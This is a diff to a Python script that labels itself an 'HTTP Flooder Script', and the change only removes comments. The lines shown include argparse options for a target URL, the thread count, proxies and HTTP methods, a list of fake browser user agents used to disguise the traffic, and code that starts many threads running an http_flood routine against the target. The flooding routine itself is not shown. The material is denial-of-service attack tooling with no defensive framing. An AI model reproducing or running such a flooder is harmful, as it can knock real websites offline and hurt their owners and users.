@@ -6,13 +6,12 @@ import time
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-# ANSI escape codes for colors
 class Colors:
-    SUCCESS = '\033[92m'  # Green
-    FAILURE = '\033[91m'  # Red
-    INFO = '\033[93m'     # Yellow
-    BANNER = '\033[94m'   # Blue
-    RESET = '\033[0m'     # Reset to default
+    SUCCESS = '\033[92m'
+    FAILURE = '\033[91m'
+    INFO = '\033[93m'
+    BANNER = '\033[94m'
+    RESET = '\033[0m'
 
 banner = f"""
 {Colors.BANNER}
@@ -28,7 +27,6 @@ banner = f"""
 
 print(banner)
 
-# Configuration using argparse
 parser = argparse.ArgumentParser(description='HTTP Flooder Script')
 parser.add_argument('--url', required=True, help='Target URL to flood')
 parser.add_argument('--threads', type=int, default=50, help='Number of threads (default: 50)')
@@ -47,7 +45,6 @@ log_responses = args.log
 proxy_list = args.proxies.split(',') if args.proxies else []
 http_methods = args.methods.split(',')
 
-# Extended list of fake user agents
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
@@ -115,14 +112,12 @@ def main():
     if http_methods:
         print(f"{Colors.INFO}Methods: {', '.join(http_methods)}{Colors.RESET}")
 
-    # Start threads with a stop event
     stop_event = threading.Event()
     threads = [threading.Thread(target=http_flood, args=(stop_event,)) for _ in range(num_threads)]
     for thread in threads:
         thread.daemon = True
         thread.start()
 
-    # Keep main thread alive
     try:
         while True:
             time.sleep(1)
